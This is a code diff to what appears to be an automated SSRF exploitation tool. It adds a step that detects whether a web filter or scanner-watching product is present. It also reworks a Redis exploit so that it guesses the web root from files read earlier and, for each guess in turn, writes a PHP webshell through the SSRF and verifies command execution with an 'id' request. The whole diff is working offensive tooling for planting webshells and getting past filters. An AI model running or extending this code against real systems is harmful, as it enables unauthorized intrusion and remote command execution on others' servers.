@@ -23,6 +23,8 @@ from ...core.mutate import Kind
 from ...core.params import Encode, rewrite
 from ...core.protocols import gopher_http, redis_command
 from ...engine.blackboard import Confidence
+from ...engine.filterprobe import probe_filter, probe_without_agent
+from ...engine.webroot import roots_for_run
 from ...engine.inject import (
     candidates as _candidates,
     inject as _inject,
@@ -123,6 +125,42 @@ def _try_probes(ctx: RunContext, probes, action: str, family: str) -> bool:
 
 
 # --------------------------------------------------------------------- actions
+
+
+def probe_filter_action(ctx: RunContext) -> None:
+    """Ask once whether anything is filtering, before payloads are spent.
+
+    An SSRF payload is a URL, so what a filter catches here is different from
+    what it catches elsewhere - but whether one exists, and which product it is,
+    changes what the address mutations should try first. Two requests buys that
+    for the whole run.
+    """
+    candidates = _candidates(ctx)
+    if not candidates:
+        return
+    outcome = probe_filter(ctx, candidates[0])
+    if outcome.refused:
+        ctx.info(f"   {outcome.describe()}")
+        ctx.blackboard.set(
+            "filter.detected",
+            True,
+            evidence=outcome.describe(),
+            confidence=Confidence.LIKELY,
+        )
+    elif outcome.note:
+        ctx.info(f"   {outcome.note}")
+
+    bare = probe_without_agent(ctx, candidates[0])
+    if bare.refused and bare.note:
+        ctx.info(f"   {bare.note}")
+        ctx.blackboard.set(
+            "filter.watches-for-scanners",
+            True,
+            evidence=bare.note,
+            confidence=Confidence.LIKELY,
+        )
+    elif bare.note:
+        ctx.log(f"   {bare.note}")
 
 
 def probe_metadata(ctx: RunContext) -> None:
@@ -606,11 +644,22 @@ def _redis_exploitable(ctx: RunContext) -> str:
 
 
 def _exploit_redis(ctx: RunContext, base: str) -> None:
-    webroot = ctx.config.get("webroot")
+    """Write a file through Redis, at a path worked out rather than asked for.
+
+    The web root is usually already known: any file this run managed to read says
+    where one is, and the path it was read from is a better answer than a form
+    field. `--webroot` still wins when the operator gives it - a human who knows
+    the target beats anything inferred - but the common case no longer needs it.
+    """
     shell_name = ctx.config.get("shell_name") or DEFAULT_SHELL_NAME
-    if not webroot:
-        ctx.info("  redis answers; pass --webroot to write a file through its persistence path")
+    roots = roots_for_run(ctx.blackboard, operator_said=ctx.config.get("webroot") or "")
+    if not roots.guesses:
+        ctx.info(
+            "  redis answers; the web root could not be established, so pass --webroot "
+            "to write a file through its persistence path"
+        )
         return
+    ctx.info(f"  {roots.describe()}")
 
     unable = _redis_exploitable(ctx)
     if unable:
@@ -618,8 +667,16 @@ def _exploit_redis(ctx: RunContext, base: str) -> None:
         ctx.blackboard.mark_dead_end("exploit.redis-webshell", f"redis refused: {unable}")
         return
 
-    payload = redis_write_file("127.0.0.1", 6379, webroot, shell_name, php_webshell())
-    _send_exploit(ctx, payload, "redis-webshell", verify_url=f"{base}/{shell_name}?c=id")
+    # Tried best first, and the run stops at the one that works. A wrong guess
+    # costs one write and one request to read back; a right one is the shell.
+    for guess in roots.guesses:
+        payload = redis_write_file("127.0.0.1", 6379, guess.path, shell_name, php_webshell())
+        if _send_exploit(ctx, payload, "redis-webshell", verify_url=f"{base}/{shell_name}?c=id"):
+            return
+    ctx.blackboard.mark_dead_end(
+        "exploit.redis-webshell",
+        f"redis accepted the write but nothing served it from {len(roots.guesses)} candidate path(s)",
+    )
 
 
 def _exploit_phpfpm(ctx: RunContext) -> None:
@@ -691,10 +748,16 @@ def _send_exploit(
         )
         ctx.emit(f"  [>] {name}: payload sent through {param.key()}")
         if verify_url:
-            _verify_execution(ctx, verify_url, name)
-        elif expect:
+            if _verify_execution(ctx, verify_url, name):
+                return True
+            # Accepted by the service but nothing served it: with a path that was
+            # guessed rather than seen, that is the wrong directory and the next
+            # candidate is worth a try.
+            return False
+        if expect:
             ctx.emit(f"  [!] {name}: the payload was accepted but the reply carries no proof of execution")
-        return
+        return False
+    return False
 
 
 def _service_refusal(reply: str) -> str:
@@ -709,7 +772,8 @@ def _service_refusal(reply: str) -> str:
     return ""
 
 
-def _verify_execution(ctx: RunContext, url: str, name: str) -> None:
+def _verify_execution(ctx: RunContext, url: str, name: str) -> bool:
+    """Whether the follow-up request proves the file that was written executes."""
     exchange = ctx.send(Request.from_url(url), action=f"exploit.{name}.verify")
     body = exchange.response.text
     if "uid=" in body:
@@ -720,8 +784,9 @@ def _verify_execution(ctx: RunContext, url: str, name: str) -> None:
             confidence=Confidence.CONFIRMED,
         )
         ctx.emit(f"  [+] {name}: command execution confirmed")
-    else:
-        ctx.emit(f"  [!] {name}: the payload was accepted but the follow-up request did not prove execution")
+        return True
+    ctx.emit(f"  [!] {name}: the payload was accepted but the follow-up request did not prove execution")
+    return False
 
 
 def confirm_execution(ctx: RunContext) -> None:
@@ -766,6 +831,7 @@ def build_graph(name: str = "ssrf") -> StateGraph:
             name="probe",
             description="does the input reach a fetcher, and how does it answer",
             actions=[
+                Action("filter.probe", "find out whether anything is filtering", probe_filter_action),
                 Action("probe.metadata", "ask for cloud instance metadata", probe_metadata),
                 Action("probe.metadata.headers", "ask again, with the header it demands", probe_metadata_headers),
                 Action("probe.file", "ask a fetch to read a local file", probe_file),
